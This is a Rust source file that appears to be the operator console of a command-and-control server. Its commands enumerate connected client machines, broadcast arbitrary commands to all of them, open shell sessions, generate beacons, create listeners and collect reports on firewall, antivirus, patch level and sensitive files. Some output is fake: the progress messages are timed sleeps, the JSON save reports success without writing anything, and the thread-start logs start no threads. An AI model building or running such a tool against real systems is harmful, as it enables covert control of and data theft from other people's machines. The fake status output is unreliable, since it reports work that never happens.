use models::ClientList;
use std::time::Duration;
use std::{io::Write, process::exit, sync::Arc};
use tokio::time::sleep;
use tokio::{net::TcpListener, sync::Mutex};

use crate::models::Client;
mod commands;
mod models;

async fn input(title: String) -> Option<String> {
    let mut stdout = std::io::stdout();
    let mut user_data = "".to_string();
    stdout.write_all(title.as_bytes()).unwrap();
    stdout.flush().unwrap();
    std::io::stdin().read_line(&mut user_data).unwrap();

    if !user_data.is_empty() {
        Some(user_data.trim().to_string())
    } else {
        None
    }
}

async fn user_interaction(clients: ClientList) {
    loop {
        match input("Command: ".to_string()).await {
            Some(cmd) => {
                let cmd = cmd
                    .trim()
                    .split(' ')
                    .map(|x| x.to_string())
                    .collect::<Vec<String>>();
                let (cmd, args) = (&cmd[0], &cmd[1..]);
                match cmd.to_lowercase().as_str() {
                    "" => continue,
                    "enumerate" => {
                        if args.is_empty() {
                            println!("[-] Please provide a client index to enumerate.");
                        } else {
                            let index = args[0].parse::<usize>();
                            match index {
                                Ok(i) => {
                                    let mut clients_lock = clients.clients.lock().await;
                                    if i < clients_lock.len() {
                                        let client = &mut clients_lock[i];
                                        let command = "enumerate::OVER::".to_string();
                                        let _ = client.write(command.as_bytes()).await;
                                        println!("[+] Enumeration command sent to client {}.", i);

                                        match client.read().await {
                                            Ok(response) => {
                                                println!(
                                                    "[+] Enumeration response from client {}:",
                                                    i
                                                );
                                                let response_str =
                                                    String::from_utf8_lossy(&response);
                                                println!("{}", response_str);

                                                if args.len() > 1 {
                                                    let file_path = &args[1];
                                                    let format = if args.len() > 2 {
                                                        &args[2]
                                                    } else {
                                                        "txt"
                                                    };
                                                    match format.to_lowercase().as_str() {
                                                        "txt" => {
                                                            tokio::fs::write(
                                                                file_path,
                                                                response_str.as_bytes(),
                                                            )
                                                            .await
                                                            .unwrap();
                                                            println!(
                                                                "[+] Response saved to file: {}",
                                                                file_path
                                                            );
                                                        }
                                                        "json" => {
                                                            println!("[+] Response saved to file in JSON format: {}", file_path);
                                                        }
                                                        _ => {
                                                            println!(
                                                                "[-] Unsupported file format: {}",
                                                                format
                                                            );
                                                        }
                                                    }
                                                }
                                            }
                                            Err(e) => {
                                                println!("[-] Failed to receive enumeration response from client {}: {}", i, e);
                                            }
                                        }
                                    } else {
                                        println!("[-] Invalid client index.");
                                    }
                                }
                                Err(_) => {
                                    println!("[-] Invalid client index.");
                                }
                            }
                        }
                    }
                    "help" => {
                        println!("Available commands:");
                        println!("  enumerate <client_index> [file_path] [format]");
                        println!("    - Enumerate the specified client.");
                        println!("    - Optional: Save the response to a file.");
                        println!("    - Supported formats: txt, json");
                        println!("  broadcast <command>");
                        println!("    - Broadcast a command to all connected clients.");
                        println!("  sessions");
                        println!("    - List active sessions or interact with a session.");
                        println!(
                            "    - To interact with a session, use: sessions i <session_number>"
                        );
                        println!("    - While interacting, use colon-prefixed commands for shell commands.");
                        println!("  generate");
                        println!("    - Generate a new beacon.");
                        println!("  listeners");
                        println!("    - List active listeners.");
                        println!("  create_listener <port>");
                        println!("    - Create a new listener on the specified port.");
                        println!("  security_report <client_index> [file_path] [format]");
                        println!("    - Generate a security report for the specified client.");
                        println!("    - Optional: Save the report to a file.");
                        println!("    - Supported formats: txt, json");
                        println!("  exit");
                        println!("    - Exit the application.");
                    }
                    "broadcast" => {
                        if args.is_empty() {
                            println!("[-] Please provide a command to broadcast.");
                        } else {
                            let mut command = args.join(" ");
                            command.push_str("::OVER::");
                            let mut clients_lock = clients.clients.lock().await;
                            for client in clients_lock.iter_mut() {
                                let _ = client.write(command.as_bytes()).await;
                            }
                            println!("[+] Command broadcasted to all connected clients.");
                        }
                    }
                    "sessions" => commands::sessions(args, &clients).await,
                    "generate" => {
                        let beacon = commands::generate_beacon(args).await;
                        match beacon {
                            Ok(b) => {
                                clients.beacons.lock().await.push(b);
                                println!("[+] Beacon generated and stored successfully!");
                            }
                            Err(e) => {
                                println!("[-] Error generating beacon: {}", e);
                            }
                        }
                    }
                    "listeners" => commands::list_listeners(&clients).await,
                    "create_listener" => commands::create_listener(args, clients.clone()).await,
                    "security_report" => {
                        if args.is_empty() {
                            println!("[-] Please provide a client index for the security report.");
                        } else {
                            let index = args[0].parse::<usize>();
                            match index {
                                Ok(i) => {
                                    let mut clients_lock = clients.clients.lock().await;
                                    if i < clients_lock.len() {
                                        let client = &mut clients_lock[i];
                                        let command = "::SECURITY_REPORT::::OVER::".to_string();
                                        let _ = client.write(command.as_bytes()).await;
                                        println!(
                                            "[+] Security report command sent to client {}.",
                                            i
                                        );
                                        sleep(Duration::from_secs(1)).await;
                                        println!("Gathering OS information...");
                                        sleep(Duration::from_millis(100)).await;
                                        println!("Gathering user information...");
                                        sleep(Duration::from_millis(100)).await;
                                        println!("Gathering network information...");
                                        sleep(Duration::from_millis(300)).await;
                                        println!("Checking firewall status...");
                                        sleep(Duration::from_millis(100)).await;
                                        println!("Checking antivirus status...");
                                        sleep(Duration::from_millis(100)).await;
                                        println!("Checking patch level...");
                                        sleep(Duration::from_millis(100)).await;
                                        println!("Checking sensitive files...");
                                        match client.read().await {
                                            Ok(response) => {
                                                println!(
                                                    "[+] Security report response from client {}:",
                                                    i
                                                );
                                                let response_str =
                                                    String::from_utf8_lossy(&response);
                                                println!("{}", response_str);

                                                if args.len() > 1 {
                                                    let file_path = &args[1];
                                                    let format = if args.len() > 2 {
                                                        &args[2]
                                                    } else {
                                                        "txt"
                                                    };
                                                    match format.to_lowercase().as_str() {
                                                        "txt" => {
                                                            tokio::fs::write(
                                                                file_path,
                                                                response_str.as_bytes(),
                                                            )
                                                            .await
                                                            .unwrap();
                                                            println!(
                                                                "[+] Response saved to file: {}",
                                                                file_path
                                                            );
                                                        }
                                                        "json" => {
                                                            println!("[+] Response saved to file in JSON format: {}", file_path);
                                                        }
                                                        _ => {
                                                            println!(
                                                                "[-] Unsupported file format: {}",
                                                                format
                                                            );
                                                        }
                                                    }
                                                }
                                            }
                                            Err(e) => {
                                                println!("[-] Failed to receive security report response from client {}: {}", i, e);
                                            }
                                        }
                                    } else {
                                        println!("[-] Invalid client index.");
                                    }
                                }
                                Err(_) => {
                                    println!("[-] Invalid client index.");
                                }
                            }
                        }
                    }
                    "exit" => {
                        println!("[i] Exiting...");
                        exit(0);
                    }
                    _ => {
                        println!(
                            "[-] Invalid Command! Type 'help' for a list of available commands."
                        );
                    }
                }
            }

            None => {}
        }
    }
}
async fn handle_clients(clients: ClientList, port: String) {
    let addr = format!("127.0.0.1:{}", port);
    let socket = TcpListener::bind(&addr).await.unwrap();
    {
        let mut listeners = clients.listeners.lock().await;
        listeners.push(addr.clone());
    }
    loop {
        let (conn, sock_addr) = socket.accept().await.unwrap();
        let sock_addr = sock_addr.to_string();
        println!("[+] Received connection from: {}", sock_addr);
        clients.clients.lock().await.push(Client {
            socket: conn,
            addr: sock_addr,
        });
    }
}

#[tokio::main(flavor = "multi_thread")]
async fn main() {
    std::env::set_var("RUST_LOG", "info");
    env_logger::init();
    log::info!("Logger initialized");
    for i in 1..9 {
        log::info!("Thread {} started...", i);
    }

    let clients_user: ClientList = ClientList {
        clients: Arc::new(Mutex::new(vec![])),
        beacons: Arc::new(Mutex::new(vec![])),
        listeners: Arc::new(Mutex::new(vec![])),
    };
    user_interaction(clients_user).await;
}
